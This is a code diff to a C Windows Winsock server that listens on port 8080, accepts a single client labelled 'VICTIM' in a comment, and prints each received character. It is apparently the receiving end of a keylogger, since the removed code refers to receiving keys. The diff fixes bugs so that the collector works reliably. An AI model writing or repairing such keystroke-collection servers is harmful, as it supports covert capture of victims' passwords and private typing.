@@ -1,118 +1,109 @@
 #include <stdio.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
-#include <winsock.h>
 
 #define WSA_VERSION_CODE 0x202
-#define SERV_ADDR "127.0.0.1" 
-SOCKET server_socket, client_socket;
+#define SERV_ADDR "127.0.0.1"
+#define CON_PORT 8080
+SOCKET serverSocket, clientSocket;
 
-DWORD WINAPI client_handler(LPVOID);
+DWORD WINAPI clientHandler(LPVOID);
 
-int main(int argc, char** argv){
+int main(void){
     
     WSADATA wsadata;
-    HANDLE thread_handle;
-    DWORD t_id, t_exit_code, bind_result;
-    SOCKADDR_IN server_addr;
+    HANDLE threadHandle;
+    DWORD tID, tExitCode;
+    int bindResult;
+    SOCKADDR_IN serverAddr;
 
     //INITIALIZE WIN SOCKET API
     if(WSAStartup(WSA_VERSION_CODE, &wsadata) == 0){
         printf("WSA initialized successfully \n");
     }else{
-        printf("WSA initialization failed. Err code:%d", getLastError());
+        printf("WSA initialization failed. Err code:%ld", GetLastError());
         WSACleanup();
         return -1;
     }
 
     //CREATE SERVER SOCKET TO BIND
-    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if(server_socket == INVALID_SOCKET){
-        printf("Socket initialization failed. Err code:%d", getLastError());
+    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(serverSocket == INVALID_SOCKET){
+        printf("Socket initialization failed. Err code:%ld", GetLastError());
         WSACleanup();
         return -1;
     }
     printf("Socket initialized successfully \n");
 
-    //CONFIGURE SERVER ADDRESS
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(8080);
-    server_addr.sin_addr.s_addr = INADDR_ANY;
+    //INITIALIZE SOCKET SERVER ADDRESS TO BIND
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(CON_PORT);
 
     //BIND SOCKET TO ADDRESS
-    bind_result = bind(server_socket, (SOCKADDR*)&server_addr, sizeof(server_addr));
-    if(bind_result == SOCKET_ERROR){
-        printf("Socket binding failed. Err code:%d", getLastError());
-        closesocket(server_socket);
+    bindResult = bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
+    if(bindResult == SOCKET_ERROR){
+        printf("Socket binding failed. Err code:%ld", GetLastError());
+        closesocket(serverSocket);
         WSACleanup();
         return -1;
-    }
-    printf("Socket bound to address successfully \n");
-
-    //INITIALIZE SOCKET SERVER ADDRESS TO BIND
-    server_addr.sin_addr.s_addr = inet_addr(SERV_ADDR);
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(8080);
-
-    //BIND SERVER IP WITH THE SOCKET
-    bind_result = bind(server_socket, (SOCKADDR*)&server_addr, sizeof(server_addr));
-    if(bind_result == SOCKET_ERROR){
-        printf("Socket binding failed. Err code:%d", getLastError());
-        closesocket(server_socket);
-        WSACleanup();
-        return -1;
-    }else{ 
+    }else{
         printf("Socket bound to address successfully \n");
     }
 
     //LISTEN FOR THE CLIENT (VICTIM)
-    if(!listen(server_socket, 1)){
+    if(!listen(serverSocket, 1)){
         printf("Listening for the clients...\n");
 
         //ACCEPT THE CLIENT, GET ITS ADDRESS AND CREATE A THREAD FOR IT
-        client_socket = accept(server_socket, NULL, NULL);
-        if(client_socket != INVALID_SOCKET){
-            print("Client connected.\n");
-            thread_handle = CreateThread(NULL, 0, &client_handler, NULL, 0, &t_id);
+        clientSocket = accept(serverSocket, NULL, NULL);
+        if(clientSocket != INVALID_SOCKET){
+            printf("Client connected.\n");
+            threadHandle = CreateThread(NULL, 0, &clientHandler, NULL, 0, &tID);
 
             //WAIT UNTIL THE THREAD TERMINATES
-            WaitForSingleObject(thread_handle, INFINITE);
-            GetExitCodeThread(thread_handle, &t_exit_code);
-            TerminateThread(thread_handle, t_exit_code);
+            WaitForSingleObject(threadHandle, INFINITE);
+            GetExitCodeThread(threadHandle, &tExitCode);
+            TerminateThread(threadHandle, tExitCode);
         }
     }else{
-        printf("An error ocurred during listening to clients. Err code:%d", GetLastError());
-        closesocket(server_socket);
+        printf("An error occurred during listening to clients. Err code:%ld", GetLastError());
+        closesocket(serverSocket);
         WSACleanup();
     }
 
     //AFTER THE OPERATION TERMINATES, SHUTDOWN AND THEN CLOSE THE SOCKETS
-    shutdown(client_socket, SD_BOTH);
-    shutdown(server_socket, SD_BOTH);
-    closesocket(client_socket);
-    closesocket(server_socket);
+    shutdown(clientSocket, SD_BOTH);
+    shutdown(serverSocket, SD_BOTH);
+    closesocket(clientSocket);
+    closesocket(serverSocket);
     WSACleanup();
 
     return 0;
 }
 
 DWORD WINAPI clientHandler(LPVOID params){
+    (void)params;
     BOOL thread_alive = TRUE;
-    DWORD bytes_transferred;
+    int bytes_transferred;
     CHAR char_to_recv;
 
-    while(thread_alive){
-        bytes_transferred = recv(client_socket, &char_to_recv, 1, 0);
+    printf("Waiting for data...\n");
+
+    while(1){
+        bytes_transferred = recv(clientSocket, &char_to_recv, 1, 0);
+        
         if(bytes_transferred > 0){
-            if(char_to_recv == '\0'){
-                thread_alive = FALSE;
-                printf("Client disconnected\n");
-            }else if(!bytes_transferred){
-                Sleep(1000);
-            }else{
-                printf("Unable to receive key. Error code: %d\n", WSAGetLastError());
-                thread_alive = FALSE;
-                return -1;
-            }
+            printf("%c", char_to_recv);
+            fflush(stdout); 
+        } else if (bytes_transferred == 0) {
+            printf("\n[Client disconnected]\n");
+            break;
+        } else {
+            printf("\nConnection lost. Error code: %d\n", WSAGetLastError());
+            break;
         }
     }
+    return 0;
 }
